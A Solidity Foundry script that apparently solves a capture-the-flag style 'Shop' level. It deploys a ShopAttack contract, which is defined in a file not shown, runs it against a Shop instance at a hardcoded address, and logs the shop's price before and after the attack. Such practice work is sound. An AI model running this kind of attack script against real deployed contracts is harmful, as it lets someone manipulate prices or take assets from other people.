// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {ShopAttack} from "../src/attacks/ShopAttack.sol";
import {Shop} from "../src/levels/Shop.sol";

contract ShopScript is Script {
    Shop public instance = Shop(payable(0x7eDE22872D98F151A422De0b9B8EDf99F126272d));
    ShopAttack public attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new ShopAttack();
	console.log("ShopAttack Contract deployed to:", address(attacker));
	console.log("Shop Contract initial price:", instance.price());
	console.log("Attacking...");
	attacker.attack(address(instance));
	console.log("Shop Contract new price:", instance.price());
	vm.stopBroadcast();
    }
}
